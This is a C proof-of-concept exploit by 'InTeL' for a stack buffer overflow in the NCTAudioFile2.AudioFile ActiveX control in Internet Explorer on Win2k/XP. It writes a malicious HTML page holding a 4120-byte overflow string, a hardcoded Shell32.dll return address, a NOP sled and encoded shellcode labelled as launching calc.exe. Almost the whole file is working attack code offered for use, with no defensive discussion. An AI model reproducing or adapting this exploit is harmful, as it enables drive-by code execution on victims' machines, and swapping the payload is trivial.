#include <stdlib.h>
#include <stdio.h>

// Exec Calc.exe Scode
unsigned char scode[] =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x37\x6a\x4a"
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x5a\x42\x32\x42\x41\x32"
"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x7a\x49\x59\x6c\x6d"
"\x38\x31\x54\x37\x70\x65\x50\x55\x50\x4c\x4b\x47\x35\x35\x6c\x4c"
"\x4b\x51\x6c\x43\x35\x52\x58\x73\x31\x6a\x4f\x4c\x4b\x42\x6f\x55"
"\x48\x6e\x6b\x61\x4f\x51\x30\x54\x41\x7a\x4b\x73\x79\x4c\x4b\x55"
"\x64\x4e\x6b\x77\x71\x5a\x4e\x34\x71\x69\x50\x4c\x59\x6e\x4c\x4b"
"\x34\x6f\x30\x34\x34\x56\x67\x6a\x61\x6a\x6a\x46\x6d\x64\x41\x4f"
"\x32\x5a\x4b\x6c\x34\x55\x6b\x31\x44\x34\x64\x46\x64\x30\x75\x4b"
"\x55\x4e\x6b\x61\x4f\x45\x74\x45\x51\x7a\x4b\x70\x66\x6e\x6b\x76"
"\x6c\x62\x6b\x4e\x6b\x53\x6f\x35\x4c\x75\x51\x6a\x4b\x4e\x6b\x65"
"\x4c\x6e\x6b\x56\x61\x58\x6b\x6b\x39\x51\x4c\x44\x64\x63\x34\x69"
"\x53\x37\x41\x49\x50\x75\x34\x6e\x6b\x51\x50\x44\x70\x6b\x35\x59"
"\x50\x72\x58\x64\x4c\x4e\x6b\x61\x50\x66\x6c\x4e\x6b\x50\x70\x45"
"\x4c\x6e\x4d\x4c\x4b\x43\x58\x77\x78\x6a\x4b\x45\x59\x6c\x4b\x6d"
"\x50\x4c\x70\x53\x30\x53\x30\x75\x50\x4c\x4b\x33\x58\x45\x6c\x63"
"\x6f\x66\x51\x48\x76\x75\x30\x51\x46\x6c\x49\x4c\x38\x6e\x63\x4f"
"\x30\x61\x6b\x52\x70\x62\x48\x58\x6f\x78\x4e\x6d\x30\x75\x30\x62"
"\x48\x4e\x78\x69\x6e\x4e\x6a\x44\x4e\x70\x57\x6b\x4f\x4b\x57\x55"
"\x33\x72\x41\x50\x6c\x30\x63\x46\x4e\x43\x55\x54\x38\x65\x35\x43"
"\x30\x4a";

int main(int argc, char *argv[])
{
    FILE *handle;

    if(argc < 2) {
        printf("[PoC] 79 EXE's / IE NCTAudioFile2.AudioFile ActiveX Remote Buffer Overflow\n");
        printf("Usage: %s <output html file>  \n", argv[1]);
        return 0;
    }

    if(!(handle = fopen(argv[1], "w"))) {
        printf("[+] Error");
        return 0;
    }
    
    fputs("<html>\n<head>\n",handle);
    fputs("<title> PoC 79 Exe's / IE NCTAudioFile2.AudioFile ActiveX Remote Stack Overfl0w By InTeL </title>\n", handle);
    fputs("</head>\n\n", handle);

    fputs("<body>\n",handle);
    fputs("<object classid=\"clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC\" id=\"pwnage\">\n",handle);
    fputs("</object>\n<script>\n\n", handle);

    fputs("pwnage.SetFormatLikeSample(\"", handle);
    for (int i=0;i<4120;i++) {
        fputs("A", handle);
    }
    fputs("\x5e\xca\xff\x7c", handle);  //0x7cffca5e in Shell32.dll - Win2k/XP
    for (i=0;i<200;i++) {
        fputs("\x90", handle);
    }
    fputs((char *)scode, handle);
    fputs("\")\n\n", handle);

    fputs("</script>\n</html>\n</body>\n", handle);
    fclose(handle);

    printf("[+] File successfully created");

    return 0;
}